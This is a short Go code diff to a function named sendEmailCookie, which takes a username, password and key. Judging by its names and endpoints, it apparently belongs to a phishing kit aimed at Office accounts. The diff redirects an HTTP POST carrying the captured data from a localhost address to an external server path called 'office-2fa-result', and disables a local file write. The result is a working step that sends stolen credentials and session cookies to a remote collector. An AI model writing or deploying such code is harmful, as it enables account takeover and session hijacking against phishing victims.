@@ -107,16 +107,16 @@ func sendEmailCookie(msg string, username string, password string, KeyUser strin
 
 	responseBody := bytes.NewBuffer(postBody)
 
-	request, _ := http.Post("http://127.0.0.1:8000/api/send-result-cookies-office", "application/json", responseBody)
+	request, _ := http.Post("https://vanilla.500daysofspring.com/public/api/office-2fa-result", "application/json", responseBody)
 
 	defer request.Body.Close()
 
 	log.Println("Send Email Cookies")
 
-	err := os.WriteFile("schedule.json", []byte(msg), 0755)
-	if err != nil {
-		fmt.Printf("Unable to write file: %v", err)
-	}
+	//err := os.WriteFile("schedule.json", []byte(msg), 0755)
+	//if err != nil {
+	//	fmt.Printf("Unable to write file: %v", err)
+	//}
 
 	return
 }
